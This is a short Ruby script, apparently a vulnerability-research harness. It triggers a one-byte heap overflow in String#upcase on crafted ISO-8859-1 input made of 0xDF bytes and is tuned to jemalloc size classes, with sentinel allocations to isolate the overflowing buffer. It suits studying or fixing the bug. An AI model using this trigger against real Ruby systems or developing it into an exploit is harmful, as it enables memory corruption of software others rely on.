# jemexact1: exact-size-class one-byte overflow under jemalloc.
#
# glibc's size-field lane needs R == 8 (mod 16) to hit a chunk header;
# jemalloc has no inline header, so the equivalent condition is that the
# mapping-buffer request R = N + 44 equals a jemalloc small size class.
# Using [0xDF x 20]['a' x m][0xDF] (the 20 expansion bytes consume the
# CASE_MAPPING_ADDITIONAL_LENGTH slack) gives exactly one OOB 'S' byte for
# any m.  m=15 -> N=36, capa=56, R=80 (jemalloc bin 0x50).
#
# Arm the tracer with a sentinel malloc immediately before the upcase and
# dump again after a second sentinel, so the watched window is the case
# buffer rather than one of Ruby's many boot-time 80-byte allocations.
m = Integer(ENV.fetch('JEM_M', '15'))
arm_size = Integer(ENV.fetch('JEM_ARM_SIZE', '79225'))
post_size = Integer(ENV.fetch('JEM_POST_SIZE', '79227'))

s = ("\xDF".b * 20) + ("a".b * m) + ("\xDF".b)
s.force_encoding(Encoding::ISO_8859_1)
arm = "A" * (arm_size - 1)
STDERR.write("===REAL===\n"); STDERR.flush
r = s.upcase
post = "B" * (post_size - 1)
STDERR.write("N=#{s.bytesize} R=#{s.bytesize + 44} out=#{r.bytesize}\n")
